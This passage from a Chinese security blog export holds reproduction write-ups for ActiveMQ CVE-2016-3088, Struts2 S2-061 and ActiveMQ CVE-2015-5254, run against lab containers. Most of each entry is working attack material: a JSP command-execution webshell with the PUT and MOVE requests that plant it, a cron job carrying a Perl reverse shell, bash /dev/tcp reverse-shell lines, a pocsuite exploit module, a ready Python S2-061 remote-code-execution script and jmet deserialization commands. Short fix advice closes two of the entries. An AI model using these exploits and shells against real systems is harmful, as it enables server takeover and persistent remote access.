<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录,下载 <a href="http://archive.apache.org/dist/activemq/apache-activemq/5.7.0/activemq-parent-5.7.0-source-release.zip">ActiveMQ 5.7.0 源码</a> ，可以看到后台处理 PUT 的关键代码如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154823813.png" alt="image-20201217154823813"></p>
<p>用户可以上传文件到指定目录，该路径在 <code>conf/jetty.xml</code> 中定义，如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154544956.png" alt="image-20201217154544956"></p>
<p>顺着 PUT 方法追踪，可以看到调用了如下函数</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217155145859.png" alt="image-20201217155145859"></p>
<p>同时看到后台处理 MOVE 的关键代码如下，可以看到该方法没有对目的路径做任何限制或者过滤。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217155615911.png" alt="image-20201217155615911"></p>
<p>由此，我们可以构造PUT请求上传 webshell 到 fileserver 目录，然后通过 Move 方法将其移动到有执行权限的 admin/ 目录。</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="1-上传webshell"><a href="#1-上传webshell" class="headerlink" title="1.上传webshell"></a>1.上传webshell</h3><p>可以爆破目录(未复现成功)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;test&#x2F;123&#x2F;123 HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Content-Length: 4</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<p>admin 登陆查看目录</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217151345913.png" alt="image-20201217151345913"></p>
<p>首先 PUT 一个  Webshell 的txt到 fileserver 目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Content-Length: 330</span><br><span class="line"></span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String line&#x3D;null;</span><br><span class="line"> Process p&#x3D;Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line"> while((line&#x3D;br.readLine())!&#x3D;null)&#123;</span><br><span class="line">  out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217151116478.png" alt="image-20201217151116478"></p>
<p>查看发现上传成功</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152139322.png" alt="image-20201217152139322"></p>
<p>由于上传的是文本文件并不能被服务器解析，所以我们下一步要利用MOVE方法将上传的webshell移动到可以执行的目录并更改后缀为jsp。</p>
<p>可以解析jsp文件的路径有：</p>
<p>1．/opt/activemq/webapps/api</p>
<p>2．/opt/activemq/webapps/admin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;node016s6o5xkj6jyp130d905yk3j4l1.node0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>这里有一个坑，困惑了我很久，我的方法步骤都没有问题为什么MOVE方法会一直响应超时并且得不到任何响应的内容。尝试了很久，我一度怀疑我的</p>
<p>vulhub环境有问题，一次偶然中我用burp抓到的包去修改执行MOVE方法很快就得到了响应结果，神奇的是把这个数据包重新复制到repeater执行再次出现</p>
<p>响应超时的结果，明明是两个相同的数据包，真是令人费解，有的时候在正常渗透测试过程也会发现这个情况，根据xssle师傅分析可能是MOVE方法不稳定导致的</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152440918.png" alt="image-20201217152440918"></p>
<p>然后访问即可</p>
<p><a href="http://172.20.10.3:8161/api/1.jsp?cmd=ls">http://172.20.10.3:8161/api/1.jsp?cmd=ls</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152645064.png" alt="image-20201217152645064"></p>
<h3 id="2-计划任务反弹"><a href="#2-计划任务反弹" class="headerlink" title="2.计划任务反弹"></a>2.计划任务反弹</h3><p>写入反弹计划命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 250</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>

<p>这里在命令后面注意把换行符修改为0a，也就是linux中的\n</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201223110657203.png" alt="image-20201223110657203"></p>
<p>移动到/etc/cron.d/目录下，遇到ubuntu目录不太一样，参考<a href="https://m3lon.github.io/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/">这里</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217153434585.png" alt="image-20201217153434585"></p>
<h3 id="3-写入ssh密钥"><a href="#3-写入ssh密钥" class="headerlink" title="3.写入ssh密钥"></a>3.写入ssh密钥</h3><p>docker未安装ssh未复现，可参考<a href="https://www.secpulse.com/archives/60064.html">这里</a></p>
<h3 id="Metasploit-反弹shell"><a href="#Metasploit-反弹shell" class="headerlink" title="Metasploit 反弹shell"></a>Metasploit 反弹shell</h3><p>进入metasploit，搜索2016-3088</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217153915502.png" alt="image-20201217153915502"></p>
<p>直接淦就完事了</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154031247.png" alt="image-20201217154031247"></p>
<h2 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h2><p>根据漏洞的原理进行编写    验证模块PUT成功即可  攻击模块进行MOVE操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pocsuite.net import req</span><br><span class="line">from pocsuite.poc import POCBase,Output</span><br><span class="line">from pocsuite.utils import register</span><br><span class="line"></span><br><span class="line">class ActiveMQPoc(POCBase):</span><br><span class="line">	vulID &#x3D; &#39;002&#39;</span><br><span class="line">	version &#x3D; &#39;1.0&#39;</span><br><span class="line">	author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">	vulDate &#x3D; &#39;2020-12-17&#39;</span><br><span class="line">	updateDate &#x3D; &#39;2020-12-17&#39;</span><br><span class="line">	references &#x3D; [&#39;https:&#x2F;&#x2F;paper.seebug.org&#x2F;346&#x2F;&#39;]</span><br><span class="line">	name &#x3D; &#39;Apache ActiveMQ (CVE-2016-3088)&#39;</span><br><span class="line">	appPowerLink &#x3D; &#39;activemq.apache.org&#39;</span><br><span class="line">	appName &#x3D; &#39;Apache activemq&#39;</span><br><span class="line">	appVersion &#x3D; &#39; Apache ActiveMQ 5.14.0&#39;</span><br><span class="line">	vulType &#x3D; &#39;Arbitrary File Reading&#39;</span><br><span class="line">	desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 			fileserverfileserverjsp\</span><br><span class="line"> 			MOVEMOVE</span><br><span class="line"> 			&#39;&#39;&#39;</span><br><span class="line">	pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 	pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> 	&#39;&#39;&#39;</span><br><span class="line">	samples &#x3D; []</span><br><span class="line">	install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line">	def _verify(self):</span><br><span class="line"> 		result &#x3D; &#123;&#125;</span><br><span class="line"> 		path &#x3D; &quot;fileserver&#x2F;1.txt&quot;</span><br><span class="line"> 		path1 &#x3D; &quot;api&#x2F;1.jsp?cmd&#x3D;ls&quot;</span><br><span class="line"> 		url &#x3D; self.url + &#39;&#x2F;&#39; + path</span><br><span class="line"> 		try:</span><br><span class="line"> 			resp &#x3D; req.put(url)</span><br><span class="line"> 			resp1 &#x3D; req.get(url)</span><br><span class="line"> 			if (resp.status_code &#x3D;&#x3D; 204 and str(resp1.status_code)[0] in (&#39;2&#39;, &#39;3&#39;)):</span><br><span class="line"> 				result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line"> 				result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line"></span><br><span class="line"> 		except Exception as ex:</span><br><span class="line"> 			pass</span><br><span class="line"></span><br><span class="line"> 		return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">	def parse_output(self, result):</span><br><span class="line"> 		output &#x3D; Output(self)</span><br><span class="line"> 		if result:</span><br><span class="line"> 			output.success(result)</span><br><span class="line"> 		else:</span><br><span class="line"> 			output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> 		return output</span><br><span class="line"></span><br><span class="line">	def _attack(self):</span><br><span class="line">		result &#x3D; &#123;&#125;</span><br><span class="line">		path &#x3D; &quot;fileserver&#x2F;1.txt&quot;</span><br><span class="line">		path1 &#x3D; &quot;api&#x2F;1.jsp?cmd&#x3D;id&quot;</span><br><span class="line">		url &#x3D; self.url + &#39;&#x2F;&#39; + path</span><br><span class="line">		url1 &#x3D; self.url + &#39;&#x2F;&#39; + path1</span><br><span class="line">		data1 &#x3D; &#39;1&#39;</span><br><span class="line">		data &#x3D; &#39;&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);String line&#x3D;null;Process p&#x3D;Runtime.getRuntime().exec(strcmd);BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));while((line&#x3D;br.readLine())!&#x3D;null)&#123;out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);&#125;%&gt;&#39;</span><br><span class="line"></span><br><span class="line">		headers &#x3D;&#123;</span><br><span class="line"> 		&#39;Destination&#39; : &#39;file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp&#39;</span><br><span class="line">		&#125;</span><br><span class="line">		headers1&#x3D;&#123;</span><br><span class="line">		&#39;Authorization&#39;:&#39;Basic YWRtaW46YWRtaW4&#x3D;&#39;,</span><br><span class="line">		&#39;Connection&#39;:&#39;close&#39;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		proxies&#x3D;&#123;</span><br><span class="line">		&#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">		&#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">		&#125;</span><br><span class="line">		try:</span><br><span class="line">			resp &#x3D; req.put(url,data&#x3D;data)</span><br><span class="line">			resp1 &#x3D; req.get(url)</span><br><span class="line">			resp2 &#x3D; req.request(&#39;MOVE&#39;,url&#x3D;url,headers&#x3D;&#123;&#39;Destination&#39; : &#39;file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;2.jsp&#39;&#125;)</span><br><span class="line">			resp3 &#x3D; req.get(url1,headers&#x3D;headers1)</span><br><span class="line">			resp3 &#x3D; resp3.text[12:50]</span><br><span class="line">			result[&#39;AdminInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">			result[&#39;AdminInfo&#39;][&#39;SHELL&#39;] &#x3D; url1</span><br><span class="line">			result[&#39;AdminInfo&#39;][&#39;EXEC &#39;] &#x3D; resp3</span><br><span class="line">		except Exception as ex:</span><br><span class="line">			pass</span><br><span class="line"></span><br><span class="line">		return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">register(ActiveMQPoc)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217173751874.png" alt="image-20201217173751874"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217214812586.png" alt="image-20201217214812586"></p>
<h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</p>
<p>2、通过移除 <code>conf\jetty.xml</code> 的以下配置来禁用 ActiveMQ Fileserver 功能</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154544956.png" alt="image-20201217154544956"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/346/">https://paper.seebug.org/346/</a></p>
<p><a href="http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/">http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>ActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2 S2-061 远程命令执行漏洞(CVE-2020-17530)复现以及脚本编写</title>
    <url>/2020/12/16/WEB/Exploit/struts2/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-17530-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞，开发人员使用了 %{…} 语法，从而攻击者可以通过构Payload，从而造成远程代码执行。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts2：2.0.0 - 2.5.25</p>
<a id="more"></a>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;struts2&#x2F;s2-061</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h4 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE                   COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">e60ea5e361ff        vulhub&#x2F;struts2:2.5.25   &quot;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;mvn-…&quot;   34 minutes ago      Up 34 minutes       0.0.0.0:8080-&gt;8080&#x2F;tcp   s2-061_struts2_1</span><br></pre></td></tr></table></figure>

<h4 id="访问漏洞环境"><a href="#访问漏洞环境" class="headerlink" title="访问漏洞环境"></a>访问漏洞环境</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216194045330.png" alt="image-20201216194045330"></p>
<h4 id="测试漏洞是否存在"><a href="#测试漏洞是否存在" class="headerlink" title="测试漏洞是否存在"></a>测试漏洞是否存在</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216194318514.png" alt="image-20201216194318514"></p>
<h4 id="直接执行命令"><a href="#直接执行命令" class="headerlink" title="直接执行命令"></a>直接执行命令</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216201525731.png" alt="image-20201216201525731"></p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>通过在线地址将bash反弹命令进行进行编码转换</p>
<p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216210508614.png" alt="image-20201216210508614"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205907765.png" alt="image-20201216205907765"></p>
<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&quot;%25%7b(%27ol4three%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27&quot;</span>+cmd+<span class="string">&quot;%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d&quot;</span></span><br><span class="line">    tturl=url+<span class="string">&quot;/?id=&quot;</span>+payload</span><br><span class="line">    r=requests.get(tturl)</span><br><span class="line">    page=r.text</span><br><span class="line"><span class="comment">#   etree=html.etree</span></span><br><span class="line">    page=etree.HTML(page)</span><br><span class="line">    data = page.xpath(<span class="string">&#x27;//a[@id]/@id&#x27;</span>)</span><br><span class="line">    print(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ EXP: python struts2-061-poc.py http://1.1.1.1:8081 id      +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ VER: Struts 2.0.0-2.5.25                                   +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ S2-061 RCE &amp;&amp; CVE-2020-17530                               +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&quot;[+]ussage: http://ip:port command&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[+]============================================================&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    url=sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line">exp(url,cmd)</span><br></pre></td></tr></table></figure>

<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216203912346.png" alt="image-20201216203912346"></p>
<h4 id="Goby-poc-开发界面"><a href="#Goby-poc-开发界面" class="headerlink" title="Goby poc 开发界面"></a>Goby poc 开发界面</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216204623455.png" alt="image-20201216204623455"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205437353.png" alt="image-20201216205437353"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205455850.png" alt="image-20201216205455850"></p>
<h4 id="单个漏洞验证"><a href="#单个漏洞验证" class="headerlink" title="单个漏洞验证"></a>单个漏洞验证</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205525154.png" alt="image-20201216205525154"></p>
<h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>将Apache Struts框架升级至最新版本</p>
<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-061">https://cwiki.apache.org/confluence/display/WW/S2-061</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew">https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>ActiveMQ漏洞复现和分析（CVE-2015-5254）</title>
    <url>/2020/12/04/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90%EF%BC%88CVE-2015-5254%EF%BC%89/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中</p>
<a id="more"></a>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub拉取漏洞环境docker启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h2><p>使用namp对目标进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV IP -p 8161,61616</span><br></pre></td></tr></table></figure>

<p>扫描结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host is up (0.00029s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">8161&#x2F;tcp  open  http     Jetty 8.1.16.v20140903</span><br><span class="line">61616&#x2F;tcp open  apachemq ActiveMQ OpenWire transport</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port61616-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;12&#x2F;13%Time&#x3D;5FD5DA4A%P&#x3D;x86_64-apple-darwin19.</span><br><span class="line">SF:0.0%r(NULL,F4,&quot;\0\0\0\xf0\x01ActiveMQ\0\0\0\n\x01\0\0\0\xde\0\0\0\t\0\x</span><br><span class="line">SF:0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\tCacheSize\x05\0\0\x04\0\0\x0cCac</span><br><span class="line">SF:heEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\x20MaxInactivityDurat</span><br><span class="line">SF:ionInitalDelay\x06\0\0\0\0\0\0&#39;\x10\0\x11TcpNoDelayEnabled\x01\x01\0\x1</span><br><span class="line">SF:5MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x14TightEncodingEnabled\x01\</span><br><span class="line">SF:x01\0\x11StackTraceEnabled\x01\x01&quot;);</span><br></pre></td></tr></table></figure>



<h2 id="默认口令漏洞"><a href="#默认口令漏洞" class="headerlink" title="默认口令漏洞"></a>默认口令漏洞</h2><p>ActiveMQ默认口令是admin/admin 登陆后可以看到对应的版本信息。<strong>放序列化需要登陆后才能触发，任意文件上传访问webshell需要登录</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201213171426069.png" alt="image-20201213171426069"></p>
<h2 id="反序列化漏洞-CVE-2015-5254"><a href="#反序列化漏洞-CVE-2015-5254" class="headerlink" title="反序列化漏洞(CVE-2015-5254)"></a>反序列化漏洞(CVE-2015-5254)</h2><p>漏洞利用过程如下：</p>
<p>a.构造(可以使用ysoserial)可执行命令的序列化对象</p>
<p>b.作为一个消息，发送给目标的61616端口</p>
<p>c.访问Web管理界面，读取消息触发漏洞</p>
<p>jmet的jar文件（这里windows和linux都经过了测试，windows在 “1.8.0_241”版本中可利用成功，linux在”11.0.7“不可以，应该是java版本导致的原因）</p>
<p><a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar">下载jmet</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;sucess&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure>

<p>发送成功如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:ol4three-55063-1607996494671-0:1</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Sent gadget &quot;ROME&quot; with command: &quot;touch &#x2F;tmp&#x2F;sucess&quot;</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:ol4three-55063-1607996494671-0:1</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215095044834.png" alt="image-20201215095044834"></p>
<p>点击队列即可触发（如果没有弱口令，可写入后等待管理员点击触发），可成功执行建立文件的命令，这里可通过以下命令进入docker查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 609d53eb4f5a &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215101659372.png" alt="image-20201215101659372"></p>
<p>反弹shell需要在<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">这里</a>将bash反弹命令进行编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;编码后的反弹命令&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215105651639.png" alt="image-20201215105651639"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞触发流程如下</p>
<p><strong>ObjectMessage.setObject() -&gt;MessageProducer.send()→MessageConsumer.recive()→ObjectMessage.getObject()</strong></p>
<p>下面是setObject()和getObject()的操作接口</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215150520127.png" alt="image-20201215150520127"></p>
